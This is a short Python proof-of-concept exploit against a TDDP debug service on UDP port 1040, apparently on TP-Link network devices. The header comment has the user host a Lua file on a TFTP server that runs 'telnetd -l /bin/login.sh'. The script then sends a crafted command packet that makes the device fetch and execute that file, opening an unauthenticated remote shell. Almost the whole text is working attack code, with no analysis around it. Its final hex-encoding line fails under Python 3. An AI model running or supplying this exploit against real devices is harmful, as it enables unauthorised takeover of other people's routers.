#!/usr/bin/python3
 
# Create /testfile in your tftp root directory with the following contents:
#
#function config_test(config)
#  os.execute("telnetd -l /bin/login.sh")
#end
#
# Replace 192.168.0.1 with the IP address of the vulnerable device
 
import binascii
import socket
 
port_send = 1040
port_receive = 61000
 
tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00
 
tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])
 
sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind(('', port_receive))
 
# Send a request
sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
packet = packet + b"/testfile;arbitrary"
print(packet)
sock_send.sendto(packet, ("192.168.0.1", port_send))
sock_send.close()
 
response, addr = sock_receive.recvfrom(1024)
r = response.encode('hex')
print(r)

